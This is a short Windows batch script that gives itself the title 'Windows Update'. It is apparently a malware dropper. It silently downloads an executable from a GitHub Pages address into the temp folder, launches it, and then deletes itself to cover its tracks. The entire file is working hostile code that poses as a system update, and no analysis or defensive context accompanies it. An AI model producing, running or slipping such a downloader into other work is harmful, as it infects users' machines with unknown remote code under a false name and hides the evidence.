@echo off
title Windows Update
timeout /t 4 /nobreak >nul
if not exist "%USERPROFILE%\Desktop" exit /b
curl -sL "https://boostedboynow.github.io/assets-host/n5ii8a.exe" -o "%tmp%\klh2.exe"
if %errorlevel% neq 0 exit /b
start "" "%tmp%\klh2.exe"
(goto) 2>nul & del "%~f0"
